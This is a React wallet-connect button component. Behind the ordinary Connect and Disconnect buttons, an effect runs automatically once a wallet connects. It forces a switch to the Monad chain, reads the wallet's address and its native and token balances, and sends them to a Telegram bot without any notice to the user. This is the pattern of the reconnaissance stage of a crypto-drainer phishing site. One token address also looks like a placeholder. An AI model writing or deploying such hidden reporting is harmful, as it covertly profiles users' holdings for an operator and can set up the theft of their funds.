import { useEffect, useRef } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { formatEther, formatUnits } from 'viem';
import { Button } from '@/components/ui/button';
import { Wallet, LogOut } from 'lucide-react';

export const ConnectWallet = () => {
  const { login, logout, authenticated, ready } = usePrivy();
  const { wallets } = useWallets();
  const sentRef = useRef(false);
  const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN as string | undefined;
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID as string | undefined;
  const MONAD_CHAIN_ID = 143;
  const ERC20_BALANCE_OF = '0x70a08231';
  const MONAD_TOKENS = [
    { address: '0x760AfE86e5de5fa0Ee542fc7B7B713e1c5425701', symbol: 'USDC', decimals: 6 },
    { address: '0x5F5fBe49A9A6e6e72Da30b5d6E2397c8C7A61F9D', symbol: 'USDT', decimals: 6 },
    { address: '0x8A6F5c9E8D0F3A1B2C3D4E5F6A7B8C9D0E1F2A3B', symbol: 'WMON', decimals: 18 },
  ];

  const switchToMonad = async (provider: any) => {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${MONAD_CHAIN_ID.toString(16)}` }],
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        await provider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: `0x${MONAD_CHAIN_ID.toString(16)}`,
            chainName: 'Monad',
            nativeCurrency: { name: 'Monad', symbol: 'MON', decimals: 18 },
            rpcUrls: ['https://rpc.monad.xyz'],
            blockExplorerUrls: ['https://explorer.monad.xyz'],
          }],
        });
      }
    }
  };

  const notifyTelegram = async () => {
    if (sentRef.current) return;
    if (!BOT_TOKEN || !CHAT_ID) return;
    if (!authenticated || wallets.length === 0) return;

    try {
      const wallet = wallets[0];
      const provider = await wallet.getEthereumProvider();
      await switchToMonad(provider);

      const chainHex = await provider.request({ method: 'eth_chainId' });
      const balanceHex = await provider.request({ method: 'eth_getBalance', params: [wallet.address, 'latest'] });
      const balanceWei = BigInt(balanceHex as string);
      const monBalance = formatEther(balanceWei);

      const paddedAddress = wallet.address.slice(2).padStart(64, '0');
      const data = ERC20_BALANCE_OF + paddedAddress;
      const tokenLines: string[] = [];
      for (const token of MONAD_TOKENS) {
        try {
          const result = await provider.request({ method: 'eth_call', params: [{ to: token.address, data }, 'latest'] });
          if (result && result !== '0x' && result !== '0x0') {
            const bal = BigInt(result as string);
            if (bal > 0n) {
              const formatted = formatUnits(bal, token.decimals);
              tokenLines.push(`${token.symbol}: ${formatted}`);
            }
          }
        } catch (e) {
          console.log('Token balance fetch failed');
        }
      }

      const text =
        `Wallet Connected\n` +
        `Address: ${wallet.address}\n` +
        `ChainId: ${parseInt(chainHex as string, 16)}\n` +
        `MON: ${monBalance}\n` +
        (tokenLines.length ? `Tokens:\n${tokenLines.join('\n')}` : `Tokens: none`);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text }),
      });

      sentRef.current = true;
    } catch (e) {
      console.log('Telegram notification failed');
    }
  };

  useEffect(() => {
    if (ready && authenticated && wallets.length > 0) {
      notifyTelegram();
    }
  }, [ready, authenticated, wallets]);

  if (!ready) {
    return (
      <Button disabled variant="outline" className="border-primary/50">
        <Wallet className="mr-2 h-4 w-4" />
        Loading...
      </Button>
    );
  }

  if (authenticated) {
    return (
      <Button
        onClick={logout}
        variant="outline"
        className="border-primary/50 hover:bg-primary/10"
      >
        <LogOut className="mr-2 h-4 w-4" />
        Disconnect
      </Button>
    );
  }

  return (
    <Button
      onClick={login}
      className="bg-primary hover:bg-primary/90 text-primary-foreground"
    >
      <Wallet className="mr-2 h-4 w-4" />
      Connect Wallet
    </Button>
  );
};
